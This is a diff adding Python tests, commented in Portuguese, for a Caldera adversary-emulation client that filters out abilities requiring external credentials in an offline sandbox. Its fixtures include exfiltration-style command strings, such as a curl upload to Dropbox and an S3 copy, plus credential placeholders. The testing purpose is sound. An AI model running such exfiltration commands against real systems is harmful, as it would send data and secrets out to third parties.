@@ -384,3 +384,62 @@ class TestContratoRealDaApiV2:
 
         enviado = _json.loads(rota.calls[0].request.content)
         assert enviado["adversary"] == {"adversary_id": "adv-real"}
+
+
+class TestExecutavelNoSandbox:
+    """Ability que exige credencial externa é descartada antes do adversário.
+
+    O sandbox é `internal: true` — sem rota para a internet, por desenho. As
+    abilities de exfiltração (Dropbox, GitHub, S3) exigem `dropbox.api.key`,
+    `github.access.token` e afins: o planner atômico não satisfaz nenhuma, não
+    gera elo e encerra a operação na hora. Foi exatamente o que aconteceu — 6
+    abilities mapeadas, 0 executadas — com o relatório dizendo só
+    `caldera_validated: false`, sem o motivo.
+    """
+
+    def _ability(self, ability_id, technique_id, command):
+        return {
+            "ability_id": ability_id,
+            "name": ability_id,
+            "technique_id": technique_id,
+            "executors": [{"platform": "linux", "command": command}],
+        }
+
+    def _mapear(self, catalogo, tecnicas):
+        client = _build_client()
+        client.client.get = MagicMock(return_value=_resp(catalogo))
+        return client._map_to_abilities(tecnicas)
+
+    def test_descarta_exfiltracao_para_servico_externo(self):
+        catalogo = [
+            self._ability("exfil", "T1567", "curl -T x https://api.dropbox.com -H '#{dropbox.api.key}'"),
+            self._ability("enum", "T1567", "whoami; echo #{host.user.name}"),
+        ]
+        assert self._mapear(catalogo, ["T1567"]) == ["enum"]
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "gh auth login --with-token #{github.access.token}",
+            "aws s3 cp x s3://b --profile #{aws.secret}",
+            "echo #{servico.api.key}",
+            "mysql -p#{db.password}",
+        ],
+    )
+    def test_descarta_qualquer_credencial(self, command):
+        catalogo = [self._ability("cred", "T1005", command)]
+        assert self._mapear(catalogo, ["T1005"]) == []
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "whoami",
+            "ls #{host.dir.compress}",
+            "curl #{server}/file",
+            "find / -user #{host.user.name}",
+        ],
+    )
+    def test_mantem_ability_local(self, command):
+        """Facts que o agente ou o próprio Caldera fornecem seguem valendo."""
+        catalogo = [self._ability("local", "T1082", command)]
+        assert self._mapear(catalogo, ["T1082"]) == ["local"]
